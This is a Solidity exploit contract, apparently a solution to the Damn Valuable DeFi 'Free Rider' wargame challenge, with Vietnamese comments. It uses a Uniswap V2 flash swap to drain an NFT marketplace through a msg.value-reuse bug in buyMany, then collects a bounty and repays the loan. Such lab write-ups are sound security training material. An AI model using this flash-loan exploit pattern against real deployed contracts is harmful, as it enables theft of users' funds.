// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderBuyer.sol";
import "./FreeRiderNFTMarketplace.sol";
import "../WETH9.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

contract FreeRiderSolution {
    FreeRiderBuyer public immutable buyer;
    FreeRiderNFTMarketplace public immutable marketplace;

    DamnValuableNFT nft;
    WETH9 weth;

    IUniswapV2Pair public pair;

    constructor(
        address _buyer,
        address payable _marketplace,
        address _nft,
        address payable _weth,
        address _pair
    ) {
        buyer = FreeRiderBuyer(_buyer);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        nft = DamnValuableNFT(_nft);
        weth = WETH9(_weth);
        pair = IUniswapV2Pair(_pair);
    }

    function attack(uint256 amount) external {
        address token0 = pair.token0();
        address token1 = pair.token1();
        // Pair của DVT và WETH
        // amount = 15 WETH
        uint256 amount0Out = address(weth) == token0 ? amount : 0;
        uint256 amount1Out = address(weth) == token1 ? amount : 0;

        bytes memory data = abi.encode(amount);
        pair.swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(
        address sender,
        uint256,
        uint256,
        bytes calldata data
    ) external {
        require(msg.sender == address(pair), "!pair");
        require(sender == address(this), "!sender");
        uint256 amount = abi.decode(data, (uint256));

        // Đổi 15 WETH vừa flashloan được sang ETH
        weth.withdraw(15 ether);
        // list NFT
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) tokenIds[i] = i;
        // Exploit lỗi mua nhiều chỉ check số dư 1 lần của Marketplace, sau khi mua xong sẽ nhận được 6 NFT lẫn 15 * 6 = 90 ETH
        marketplace.buyMany{value: 15 ether}(tokenIds);
        // Gửi 6 NFT cho buyer để nhận 45 ETH vào Attacker address
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(buyer), i);
        }
        
        // Tính phí 0.3% khi flashloan
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;
        // Deposit lượng ETH = amountToRepay để lấy WETH đem trả nợ Uniswap
        weth.deposit{value: amountToRepay}();
        // Trả nợ cho Uniswap
        weth.transfer(address(pair), amountToRepay);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
